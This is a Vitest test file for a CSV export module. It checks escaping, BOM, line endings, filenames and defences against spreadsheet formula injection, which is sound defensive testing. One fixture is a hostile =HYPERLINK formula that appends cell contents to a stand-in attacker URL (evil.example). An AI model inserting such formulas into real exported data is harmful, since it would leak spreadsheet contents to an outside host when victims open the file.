import { describe, expect, it } from "vitest";
import { csvFilename, toCsv } from "@/analytics/csv";

/**
 * The Insights export (P3-T4).
 *
 * Two failure modes, and the second one is an attack.
 *
 * A theme tag is model output in a customer's own language and a staff name is
 * whatever a reviewer typed, so a comma or a quote in either will break the
 * file's shape unless it is escaped — and a broken CSV does not error, it
 * silently shifts every column after the offending cell.
 *
 * The one that matters more: spreadsheets execute cells. A value starting `=`
 * is a formula in Excel, Sheets and LibreOffice, so a review containing
 * `=HYPERLINK(...)` becomes running code the moment a business opens the export
 * it just downloaded. That is CSV injection, and this is exactly its shape:
 * untrusted text, exported by the victim, opened without suspicion.
 */

describe("the shape of the file", () => {
  it("writes a header from the first row's keys", () => {
    const csv = toCsv([{ theme: "food", count: 3 }]);
    expect(csv).toContain("theme,count\r\nfood,3");
  });

  it("starts with a BOM, so Excel reads Turkish as Turkish", () => {
    // Without it, `Kadıköy` opens as `KadÄ±kÃ¶y` on Windows — the single most
    // likely place this file is opened.
    expect(toCsv([{ a: "Kadıköy" }]).charCodeAt(0)).toBe(0xfeff);
  });

  it("uses CRLF, which is what a spreadsheet expects", () => {
    expect(toCsv([{ a: "1" }, { a: "2" }])).toContain("\r\n");
  });

  it("returns just the BOM for no rows rather than throwing", () => {
    // A range with no reviews is a normal state, not an error.
    expect(toCsv([])).toBe("﻿");
  });

  it("leaves a missing value empty rather than writing 'null'", () => {
    expect(toCsv([{ rating: null, count: 2 }])).toContain("\r\n,2");
  });
});

describe("values that would break the file", () => {
  it("quotes a value containing a comma", () => {
    expect(toCsv([{ theme: "food, drink" }])).toContain('"food, drink"');
  });

  it("doubles quotes inside a quoted value", () => {
    expect(toCsv([{ text: 'he said "great"' }])).toContain('"he said ""great"""');
  });

  it("quotes a value containing a newline", () => {
    const csv = toCsv([{ text: "line one\nline two" }]);
    expect(csv).toContain('"line one\nline two"');
  });
});

describe("values that would run", () => {
  it("neutralises a formula, and keeps the text readable", () => {
    // The payload survives as *text* — it is what the customer wrote — but the
    // leading apostrophe means a spreadsheet renders it instead of running it.
    const csv = toCsv([{ theme: '=HYPERLINK("http://evil.example"&A1,"click")' }]);

    expect(csv).toContain("'=HYPERLINK");
    expect(csv).not.toMatch(/(^|,|\n)=HYPERLINK/);
  });

  it("covers every character a spreadsheet treats as a formula", () => {
    for (const prefix of ["=", "+", "-", "@"]) {
      const csv = toCsv([{ value: `${prefix}cmd` }]);
      expect(csv, `${prefix} should be neutralised`).toContain(`'${prefix}cmd`);
    }
  });

  it("neutralises before quoting, so the guard is not hidden by the quotes", () => {
    // A value that is both a formula and contains a comma has to end up with
    // the apostrophe *inside* the quotes; the other order produces a cell that
    // still starts with `=` once the spreadsheet strips the quoting.
    expect(toCsv([{ v: "=SUM(1,2)" }])).toContain(`"'=SUM(1,2)"`);
  });

  it("leaves an ordinary negative number alone", () => {
    // Numbers are numbers. Quoting -2 as text would make every delta column
    // unusable for the arithmetic the export exists to enable.
    expect(toCsv([{ delta: -2 }])).toContain("delta\r\n-2");
  });
});

describe("the filename", () => {
  it("says what it holds and when it was taken", () => {
    expect(csvFilename("themes", "30d", new Date("2026-08-05T09:00:00Z"))).toBe(
      "fairfame-themes-30d-2026-08-05.csv",
    );
  });
});
